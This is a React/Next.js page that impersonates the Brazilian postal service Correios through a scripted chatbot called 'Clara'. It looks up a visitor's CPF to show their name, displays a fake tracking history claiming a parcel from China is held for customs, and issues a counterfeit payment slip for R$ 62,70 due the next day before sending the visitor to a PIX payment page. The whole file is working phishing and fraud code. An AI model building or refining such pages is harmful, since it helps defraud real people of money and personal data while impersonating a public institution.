"use client"

import {
  Menu,
  FileText,
  Phone,
  ShoppingCart,
  HelpCircle,
  Users,
  Building,
  GraduationCap,
  Search,
  Lock,
  Shield,
  CheckCircle2,
} from "lucide-react"
import { useEffect, useState, useRef } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"

interface Message {
  id: number
  type: "text" | "image" | "audio" | "button" | "typing" | "icon" | "invoice" | "tracking"
  content?: string
  src?: string
  buttonText?: string
  iconType?: "check" | "clara"
  invoiceData?: InvoiceData
  onClick?: () => void
}

interface CPFData {
  nome?: string
  cpf?: string
  nascimento?: string
  sexo?: string
  nome_mae?: string
}

interface InvoiceData {
  nome: string
  cpf: string
  dataEmissao: string
  dataVencimento: string
  taxaLiberacao: string
  pesoMercadoria: string
  despachoPostal: string
  total: string
}

export default function AtendimentoPage() {
  const [isMounted, setIsMounted] = useState(false)
  const [messages, setMessages] = useState<Message[]>([])
  const [currentStep, setCurrentStep] = useState(0)
  const [cpfData, setCpfData] = useState<CPFData | null>(null)
  const [isTyping, setIsTyping] = useState(false)
  const [cpfInput, setCpfInput] = useState("")
  const [loadingCpf, setLoadingCpf] = useState(false)
  const [cpfError, setCpfError] = useState("")
  const [showCpfForm, setShowCpfForm] = useState(false)
  const [flowStarted, setFlowStarted] = useState(false)
  const searchParams = useSearchParams()
  const cpfParam = searchParams.get("cpf")
  const router = useRouter()
  const chatContainerRef = useRef<HTMLDivElement>(null)

  // Generate dates
  const today = new Date()
  const tomorrow = new Date(today)
  tomorrow.setDate(tomorrow.getDate() + 1)
  
  const formatDate = (date: Date) => {
    return date.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" })
  }

  const dataHoje = formatDate(today)
  const dataAmanha = formatDate(tomorrow)

  // Fixed values to total R$ 62,70
  const taxaLiberacao = "28,90"
  const pesoMercadoria = "18,64"
  const despachoPostal = "15,16"
  const totalPagar = "62,70"

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .replace(/(-\d{2})\d+?$/, "$1")
  }

  const handleCpfInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    setCpfInput(formatted)
    setCpfError("")
  }

  const handleCpfSubmit = async () => {
    const cleanCpf = cpfInput.replace(/\D/g, "")
    
    if (cleanCpf.length !== 11) {
      setCpfError("CPF deve conter 11 dígitos")
      return
    }

    setLoadingCpf(true)
    setCpfError("")

    try {
      const response = await fetch(`/api/cpf?cpf=${cleanCpf}`)
      const data = await response.json()

      if (data.error) {
        setCpfError(data.error)
        setLoadingCpf(false)
        return
      }

      if (data.nome) {
        setCpfData(data)
        localStorage.setItem("cpfData", JSON.stringify(data))
        setShowCpfForm(false)
      } else {
        setCpfError("CPF não encontrado")
      }
    } catch (error) {
      setCpfError("Erro ao consultar CPF")
    }
    
    setLoadingCpf(false)
  }

  useEffect(() => {
    setIsMounted(true)
    
    // Load CPF data from localStorage (comes from main page when user searches)
    const storedData = localStorage.getItem("cpfData")
    if (storedData) {
      const parsed = JSON.parse(storedData)
      if (parsed.nome) {
        setCpfData(parsed)
        setShowCpfForm(false)
      } else if (!cpfParam) {
        setShowCpfForm(true)
      }
    } else if (!cpfParam) {
      setShowCpfForm(true)
    }
  }, [])

  useEffect(() => {
    // Fetch CPF data if we have cpfParam
    if (cpfParam && isMounted) {
      setLoadingCpf(true)
      fetch(`/api/cpf?cpf=${cpfParam}`)
        .then(res => res.json())
        .then(data => {
          if (data.nome) {
            setCpfData(data)
            localStorage.setItem("cpfData", JSON.stringify(data))
          } else {
            setShowCpfForm(true)
          }
          setLoadingCpf(false)
        })
        .catch(() => {
          setShowCpfForm(true)
          setLoadingCpf(false)
        })
    }
  }, [cpfParam, isMounted])

  // Auto scroll to bottom
  useEffect(() => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTop = chatContainerRef.current.scrollHeight
    }
  }, [messages])

  const addMessage = (message: Omit<Message, "id">) => {
    setMessages(prev => [...prev, { ...message, id: Date.now() + Math.random() }])
  }

  const removeTyping = () => {
    setMessages(prev => prev.filter(m => m.type !== "typing"))
    setIsTyping(false)
  }

  const showTypingIndicator = () => {
    setIsTyping(true)
    addMessage({ type: "typing" })
  }

  const nome = cpfData?.nome || "Cliente"
  const primeiroNome = nome.split(" ")[0]

  // Chat flow
  useEffect(() => {
    if (!isMounted || !cpfData || showCpfForm || flowStarted) return
    
    setFlowStarted(true)

    const runFlow = async () => {
      // Step 1: Clara entrou no chat
      await new Promise(r => setTimeout(r, 500))
      addMessage({ type: "icon", iconType: "clara", content: "Clara entrou no chat" })
      
      // Wait 1s
      await new Promise(r => setTimeout(r, 1000))
      
      // Olá nome!
      showTypingIndicator()
      await new Promise(r => setTimeout(r, 1500))
      removeTyping()
      addMessage({ type: "text", content: `Olá <strong>${primeiroNome}</strong>!<br/>Bem-vindo(a) ao atendimento <strong>Virtual dos Correios</strong>.` })
      
      // Wait 2s
      await new Promise(r => setTimeout(r, 2000))
      
      // Image 1
      showTypingIndicator()
      await new Promise(r => setTimeout(r, 1000))
      removeTyping()
      addMessage({ type: "image", src: "https://s3.typebot.io/public/workspaces/cm8i23eay00114v61898adhxw/typebots/eoiqn7v6na2t89kp6zr49gys/blocks/r1nu036559bmzeft4wkbpyrn?v=1744289732916" })
      
      // Identificamos...
      await new Promise(r => setTimeout(r, 1500))
      showTypingIndicator()
      await new Promise(r => setTimeout(r, 2000))
      removeTyping()
      addMessage({ type: "text", content: "Identificamos Aqui no Sistema que uma de suas Encomendas Foi Taxada" })
      
      // Wait 2s
      await new Promise(r => setTimeout(r, 2000))
      
      // Tracking Component
      showTypingIndicator()
      await new Promise(r => setTimeout(r, 1500))
      removeTyping()
      addMessage({ type: "tracking" })
      
      // Wait 2s
      await new Promise(r => setTimeout(r, 2000))
      
      // Checkmark
      addMessage({ type: "icon", iconType: "check" })
      
      // nome, você deseja solicitar...
      await new Promise(r => setTimeout(r, 1500))
      showTypingIndicator()
      await new Promise(r => setTimeout(r, 2000))
      removeTyping()
      addMessage({ type: "text", content: `<strong>${primeiroNome}</strong>, você deseja solicitar a liberação da sua mercadoria?` })
      
      // Button SIM
      await new Promise(r => setTimeout(r, 500))
      setCurrentStep(1)
    }

    runFlow()
  }, [isMounted, cpfData, showCpfForm, flowStarted])

  const handleSimClick = async () => {
    setCurrentStep(0)
    
    // Remove button by advancing
    addMessage({ type: "text", content: "SIM" })
    
    // Wait 1s
    await new Promise(r => setTimeout(r, 1000))
    
    // Audio 1
    addMessage({ type: "audio", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/audio%201-wPA0qWBeZTSEDaUj2KjfpCBkUrI8Od.mp3" })
    
    // Wait 3s (for audio to start)
    await new Promise(r => setTimeout(r, 3000))
    
    // Image 2 with dates
    showTypingIndicator()
    await new Promise(r => setTimeout(r, 1500))
    removeTyping()
    addMessage({ type: "image", src: `https://img1.niftyimages.com/911h/-wd7/a0np?data_amanha=${dataAmanha}&data_hoje=${dataHoje}` })
    
    // Por que essa taxa?
    await new Promise(r => setTimeout(r, 2000))
    showTypingIndicator()
    await new Promise(r => setTimeout(r, 2500))
    removeTyping()
    addMessage({ 
      type: "text", 
      content: `<strong>Por que essa taxa?</strong><br/>A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:<br/><br/><strong>Taxa de liberação:</strong><br/>Cobrança padrão para processos alfandegários.<br/><br/><strong>Peso da mercadoria</strong> – Valor ajustado conforme o peso do item.<br/><br/><strong>Despacho postal</strong> – Serviço de liberação e envio.`
    })
    
    // Wait 4s
    await new Promise(r => setTimeout(r, 4000))
    
    // Audio 2
    addMessage({ type: "audio", src: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/audio%202-btK58TI8V2oGuHzyhEgSX2XcxuWlDC.mp3" })
    
    // Wait 3s (for audio to start)
    await new Promise(r => setTimeout(r, 3000))
    
    // Entendi button
    setCurrentStep(2)
  }

  const handleEntendiClick = async () => {
    setCurrentStep(0)
    
    addMessage({ type: "text", content: "Entendi, continuar!" })
    
    // Wait 1s
    await new Promise(r => setTimeout(r, 1000))
    
    // Image 3
    showTypingIndicator()
    await new Promise(r => setTimeout(r, 1500))
    removeTyping()
    addMessage({ type: "image", src: "https://s3.typebot.io/public/workspaces/cm8i23eay00114v61898adhxw/typebots/qtdiz2xuv8zn2tfsinqjf3a9/blocks/xjalk9817yn390rndw401sap?v=1744290207950" })
    
    // Wait 2s
    await new Promise(r => setTimeout(r, 2000))
    
    // GUIA DE PAGAMENTO - Invoice style
    showTypingIndicator()
    await new Promise(r => setTimeout(r, 2000))
    removeTyping()
    
    const invoiceData: InvoiceData = {
      nome: cpfData?.nome || "Cliente",
      cpf: cpfParam || cpfData?.cpf || "---",
      dataEmissao: dataHoje,
      dataVencimento: dataAmanha,
      taxaLiberacao,
      pesoMercadoria,
      despachoPostal,
      total: totalPagar
    }
    
    addMessage({ type: "invoice", invoiceData })
    
    // Wait 2s
    await new Promise(r => setTimeout(r, 2000))
    
    // ATENCAO
    showTypingIndicator()
    await new Promise(r => setTimeout(r, 2000))
    removeTyping()
    addMessage({ 
      type: "text", 
      content: `<strong>ATENÇÃO, ${primeiroNome}</strong><br/>CPF: <span style="background: #ffd700; padding: 2px 6px; border-radius: 4px; color: #004069; font-weight: bold;">${cpfParam || cpfData?.cpf || "---"}</span><br/><br/>Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span style="background: #ffd700; padding: 2px 6px; border-radius: 4px; color: #004069; font-weight: bold;">${dataAmanha}</span><br/><br/>Clique para acessar a guia de pagamento`
    })
    
    // Button ACESSAR GUIA
    await new Promise(r => setTimeout(r, 500))
    setCurrentStep(3)
  }

  const handleAcessarGuia = () => {
    router.push("/pix")
  }

  if (!isMounted) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">Carregando...</div>
      </div>
    )
  }

  // Tracking Component
  const TrackingComponent = () => {
    const today = new Date()
    const formatTrackingDate = (daysAgo: number, hour: number, minute: number) => {
      const date = new Date(today)
      date.setDate(date.getDate() - daysAgo)
      return `${date.toLocaleDateString("pt-BR")} ${hour.toString().padStart(2, "0")}:${minute.toString().padStart(2, "0")}`
    }

    const trackingSteps = [
      {
        icon: (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
        ),
        title: "Objeto aguardando pagamento",
        location: "CURITIBA - PR",
        date: formatTrackingDate(0, 22, 0),
        highlight: true,
        link: "Efetuar pagamento"
      },
      {
        icon: (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
          </svg>
        ),
        title: "Encaminhado para fiscalização aduaneira",
        location: "CURITIBA - PR",
        date: formatTrackingDate(22, 6, 11),
        highlight: false
      },
      {
        icon: (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/>
          </svg>
        ),
        title: "Objeto recebido pelos Correios do Brasil",
        location: "CURITIBA - PR",
        date: formatTrackingDate(23, 15, 29),
        highlight: false
      },
      {
        icon: (
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/>
          </svg>
        ),
        title: "Objeto postado",
        location: "CHINA",
        date: formatTrackingDate(30, 2, 54),
        highlight: false
      }
    ]

    return (
      <div className="bg-white rounded-lg shadow-lg overflow-hidden w-full max-w-[350px] border border-gray-200">
        <div className="bg-[#004069] text-white p-3">
          <h3 className="font-bold text-sm">Objeto Retido</h3>
        </div>
        <div className="p-3">
          {trackingSteps.map((step, index) => (
            <div key={index} className="flex gap-3">
              {/* Timeline */}
              <div className="flex flex-col items-center">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center ${step.highlight ? "bg-yellow-400 text-[#004069]" : "bg-yellow-400 text-[#004069]"}`}>
                  {step.icon}
                </div>
                {index < trackingSteps.length - 1 && (
                  <div className="w-0.5 h-full min-h-[40px] bg-yellow-400"></div>
                )}
              </div>
              {/* Content */}
              <div className="pb-4 flex-1">
                <p className={`font-semibold text-sm ${step.highlight ? "text-[#004069]" : "text-gray-800"}`}>
                  {step.title}
                </p>
                <p className="text-xs text-gray-600">{step.location}</p>
                <p className="text-xs text-gray-500">{step.date}</p>
                {step.link && (
                  <p className="text-xs mt-1">
                    Realize o pagamento: <span className="text-blue-600 underline cursor-pointer">{step.link}</span>
                  </p>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>
    )
  }

  // Invoice Component
  const InvoiceComponent = ({ data }: { data: InvoiceData }) => (
    <div className="bg-white rounded-lg shadow-lg overflow-hidden w-full max-w-[380px] border-2 border-[#004069]">
      {/* Invoice Header */}
      <div className="bg-[#004069] text-white p-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-yellow-400 rounded flex items-center justify-center">
              <span className="text-[#004069] font-bold text-sm">C</span>
            </div>
            <div>
              <p className="font-bold text-sm">CORREIOS</p>
              <p className="text-[10px] text-gray-300">Empresa Brasileira de Correios</p>
            </div>
          </div>
        </div>
      </div>
      
      {/* Yellow stripe */}
      <div className="h-2 bg-yellow-400"></div>
      
      {/* Invoice Title */}
      <div className="bg-[#004069]/10 p-2 text-center border-b">
        <p className="text-[#004069] font-bold text-sm">GUIA DE RECOLHIMENTO</p>
        <p className="text-[#004069] text-xs">TAXA ALFANDEGÁRIA</p>
      </div>
      
      {/* Customer Info */}
      <div className="p-3 border-b border-gray-200 bg-gray-50">
        <div className="grid grid-cols-2 gap-2 text-xs">
          <div>
            <p className="text-gray-500">Beneficiário:</p>
            <p className="font-semibold text-[#004069] truncate">{data.nome}</p>
          </div>
          <div>
            <p className="text-gray-500">CPF:</p>
            <p className="font-semibold text-[#004069]">{data.cpf}</p>
          </div>
          <div>
            <p className="text-gray-500">Emissão:</p>
            <p className="font-semibold">{data.dataEmissao}</p>
          </div>
          <div>
            <p className="text-gray-500">Vencimento:</p>
            <p className="font-semibold text-red-600">{data.dataVencimento}</p>
          </div>
        </div>
      </div>
      
      {/* Items */}
      <div className="p-3">
        <table className="w-full text-xs">
          <thead>
            <tr className="border-b border-gray-300">
              <th className="text-left pb-2 text-gray-600">Descrição</th>
              <th className="text-right pb-2 text-gray-600">Valor</th>
            </tr>
          </thead>
          <tbody>
            <tr className="border-b border-gray-100">
              <td className="py-2">Taxa de Liberação</td>
              <td className="text-right py-2">R$ {data.taxaLiberacao}</td>
            </tr>
            <tr className="border-b border-gray-100">
              <td className="py-2">Peso da Mercadoria</td>
              <td className="text-right py-2">R$ {data.pesoMercadoria}</td>
            </tr>
            <tr className="border-b border-gray-100">
              <td className="py-2">Despacho Postal</td>
              <td className="text-right py-2">R$ {data.despachoPostal}</td>
            </tr>
          </tbody>
        </table>
      </div>
      
      {/* Total */}
      <div className="bg-[#004069] text-white p-3">
        <div className="flex justify-between items-center">
          <span className="font-bold">TOTAL A PAGAR:</span>
          <span className="font-bold text-xl text-yellow-400">R$ {data.total}</span>
        </div>
      </div>
      
      {/* Footer */}
      <div className="bg-yellow-400 p-2 text-center">
        <p className="text-[#004069] text-[10px] font-medium">
          Guia gerada com sucesso. Efetue o pagamento para liberar sua encomenda.
        </p>
      </div>
    </div>
  )

  return (
    <div className="min-h-screen bg-[#f5f3f0] flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#f5f3f0" }}>
        <div className="flex items-center justify-between px-4 py-2">
          <div className="flex items-center gap-4">
            <button className="text-blue-600 text-sm">Acessibilidade</button>
          </div>
        </div>

        <div className="h-px bg-white w-full"></div>

        <div className="flex items-center justify-between px-4 py-3">
          <div className="md:hidden flex items-center justify-between w-full">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
            <div className="w-6"></div>
          </div>

          <div className="hidden md:flex items-center gap-4 flex-1">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
          </div>

          <div className="hidden md:flex items-center gap-2">
            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
          </div>
        </div>

        <div className="bg-yellow-400 w-full h-px"></div>
      </header>

      {/* Chat Container */}
      <main className="flex-1 flex items-center justify-center p-2 md:p-4">
        <div className="w-full max-w-[500px] md:max-w-[600px] h-[80vh] max-h-[800px] flex flex-col bg-white rounded-2xl shadow-2xl overflow-hidden">
          {/* Chat Header */}
          <div className="bg-[#004069] text-white p-4 flex items-center gap-3 shrink-0">
            <img 
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/correios-main-logo-symbol-two-arrows-blue-and-yellow-modern-3d-design-1-removebg-preview-EWNeNljpCBjApJcztefOrsyS1O6ysc.png" 
              alt="Correios" 
              className="h-10 object-contain"
            />
            <div className="flex-1">
              <h2 className="font-bold text-lg">Atendimento Correios</h2>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 bg-green-400 rounded-full"></span>
                <p className="text-xs text-gray-300">Online agora</p>
              </div>
            </div>
          </div>

          {/* CPF Form */}
          {showCpfForm && (
            <div className="flex-1 bg-[#e5ddd5] p-4 flex items-center justify-center">
              <div className="bg-white rounded-lg p-6 shadow-lg w-full max-w-[320px]">
                <div className="text-center mb-4">
                  <div className="w-16 h-16 bg-[#004069] rounded-full flex items-center justify-center mx-auto mb-3">
                    <span className="text-yellow-400 font-bold text-2xl">C</span>
                  </div>
                  <h3 className="font-bold text-[#004069] text-lg">Identificação</h3>
                  <p className="text-gray-600 text-sm mt-1">Para iniciar o atendimento, informe seu CPF</p>
                </div>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">CPF</label>
                    <input
                      type="text"
                      value={cpfInput}
                      onChange={handleCpfInputChange}
                      placeholder="000.000.000-00"
                      className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-[#004069] focus:outline-none text-center text-lg"
                      maxLength={14}
                    />
                    {cpfError && (
                      <p className="text-red-500 text-sm mt-1 text-center">{cpfError}</p>
                    )}
                  </div>
                  
                  <Button
                    onClick={handleCpfSubmit}
                    disabled={loadingCpf || cpfInput.replace(/\D/g, "").length !== 11}
                    className="w-full bg-[#004069] hover:bg-[#003050] text-white font-bold py-3 text-lg"
                  >
                    {loadingCpf ? "Consultando..." : "INICIAR ATENDIMENTO"}
                  </Button>
                </div>
              </div>
            </div>
          )}

          {/* Loading State */}
          {loadingCpf && !showCpfForm && (
            <div className="flex-1 bg-[#e5ddd5] p-4 flex items-center justify-center">
              <div className="text-center">
                <div className="w-12 h-12 border-4 border-[#004069] border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                <p className="text-gray-600">Carregando dados...</p>
              </div>
            </div>
          )}

          {/* Messages Container */}
          {!showCpfForm && !loadingCpf && (
            <div 
              ref={chatContainerRef}
              className="flex-1 bg-[#e5ddd5] p-4 overflow-y-auto space-y-3"
            >
              {messages.map((msg) => (
                <div key={msg.id} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
                  {msg.type === "typing" && (
                    <div className="flex justify-start">
                      <div className="bg-white rounded-lg p-3 shadow-sm max-w-[80%]">
                        <div className="flex gap-1">
                          <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></span>
                          <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></span>
                          <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></span>
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {msg.type === "icon" && msg.iconType === "clara" && (
                    <div className="flex justify-center">
                      <div className="bg-[#004069]/10 text-[#004069] rounded-full px-4 py-2 text-sm flex items-center gap-2">
                        <img 
                          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-ZDIteG99pzp2ntjjfpTwOzeLq8X46H.png" 
                          alt="Clara" 
                          className="w-6 h-6 rounded-full object-cover"
                        />
                        {msg.content}
                      </div>
                    </div>
                  )}
                  
                  {msg.type === "icon" && msg.iconType === "check" && (
                    <div className="flex justify-start">
                      <div className="bg-green-500 rounded-full p-2">
                        <CheckCircle2 className="w-6 h-6 text-white" />
                      </div>
                    </div>
                  )}
                  
                  {msg.type === "text" && !msg.buttonText && (
                    <div className={`flex ${msg.content === "SIM" || msg.content === "Entendi, continuar!" ? "justify-end" : "justify-start"}`}>
                      <div 
                        className={`rounded-lg p-3 shadow-sm max-w-[85%] ${
                          msg.content === "SIM" || msg.content === "Entendi, continuar!" 
                            ? "bg-[#dcf8c6]" 
                            : "bg-white"
                        }`}
                      >
                        <p 
                          className="text-sm text-gray-800 leading-relaxed"
                          dangerouslySetInnerHTML={{ __html: msg.content || "" }}
                        />
                      </div>
                    </div>
                  )}
                  
                  {msg.type === "image" && (
                    <div className="flex justify-start">
                      <div className="bg-white rounded-lg p-2 shadow-sm max-w-[90%]">
                        <img 
                          src={msg.src} 
                          alt="Imagem" 
                          className="rounded-lg max-w-full h-auto"
                        />
                      </div>
                    </div>
                  )}
                  
                  {msg.type === "audio" && (
                    <div className="flex justify-start items-end gap-2">
                      <img 
                        src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-ZDIteG99pzp2ntjjfpTwOzeLq8X46H.png" 
                        alt="Clara" 
                        className="w-8 h-8 rounded-full object-cover shrink-0"
                      />
                      <div className="bg-white rounded-2xl rounded-bl-md p-3 shadow-sm min-w-[220px] max-w-[280px]">
                        <audio 
                          controls 
                          className="w-full"
                          style={{ height: "40px" }}
                          preload="auto"
                        >
                          <source src={msg.src} type="audio/mpeg" />
                          Seu navegador nao suporta audio.
                        </audio>
                        <div className="flex justify-end mt-1">
                          <span className="text-[10px] text-gray-400">
                            {new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}

                  {msg.type === "invoice" && msg.invoiceData && (
                    <div className="flex justify-start">
                      <InvoiceComponent data={msg.invoiceData} />
                    </div>
                  )}

                  {msg.type === "tracking" && (
                    <div className="flex justify-start">
                      <TrackingComponent />
                    </div>
                  )}
                </div>
              ))}
              
              {/* Button SIM */}
              {currentStep === 1 && (
                <div className="flex justify-center mt-4 animate-in fade-in duration-300">
                  <Button 
                    onClick={handleSimClick}
                    className="bg-white hover:bg-gray-100 text-[#004069] border-2 border-[#004069] font-bold px-10 py-3 text-lg"
                  >
                    SIM
                  </Button>
                </div>
              )}
              
              {/* Button Entendi */}
              {currentStep === 2 && (
                <div className="flex justify-center mt-4 animate-in fade-in duration-300">
                  <Button 
                    onClick={handleEntendiClick}
                    className="bg-white hover:bg-gray-100 text-[#004069] border-2 border-[#004069] font-bold px-8 py-3"
                  >
                    Entendi, continuar!
                  </Button>
                </div>
              )}
              
              {/* Button Acessar Guia */}
              {currentStep === 3 && (
                <div className="flex justify-center mt-4 animate-in fade-in duration-300">
                  <Button 
                    onClick={handleAcessarGuia}
                    className="bg-yellow-400 hover:bg-yellow-500 text-[#004069] font-bold px-6 py-4 text-base shadow-lg"
                  >
                    ACESSAR GUIA DE PAGAMENTO
                  </Button>
                </div>
              )}
            </div>
          )}

          {/* Chat Footer */}
          <div className="bg-[#f0f0f0] p-3 border-t shrink-0">
            <p className="text-xs text-gray-500 text-center">
              Atendimento automatizado dos Correios
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 text-black py-6">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div>
              <h3 className="font-bold mb-3 text-[rgba(0,64,105,1)] text-base md:text-lg">Fale Conosco</h3>
              <ul className="space-y-1">
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm">Registro de Manifestações</span>
                </li>
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Central de Atendimento</span>
                </li>
                <li className="flex items-center gap-2">
                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Soluções para o seu negócio</span>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-3 text-[rgba(0,64,105,1)] text-base md:text-lg">Sobre os Correios</h3>
              <ul className="space-y-1">
                <li className="flex items-center gap-2">
                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Identidade corporativa</span>
                </li>
                <li className="flex items-center gap-2">
                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Educação e cultura</span>
                </li>
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Código de ética</span>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="font-bold mb-3 text-[rgba(0,64,105,1)] text-base md:text-lg">Informações</h3>
              <ul className="space-y-1">
                <li className="flex items-center gap-2">
                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Suporte ao cliente</span>
                </li>
                <li className="flex items-center gap-2">
                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Ouvidoria</span>
                </li>
                <li className="flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm">Segurança</span>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-[rgba(0,64,105,0.3)] mt-4 pt-4 text-center">
            <p className="text-xs text-[rgba(0,64,105,1)]">
              Correios - Empresa Brasileira de Correios e Telégrafos
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
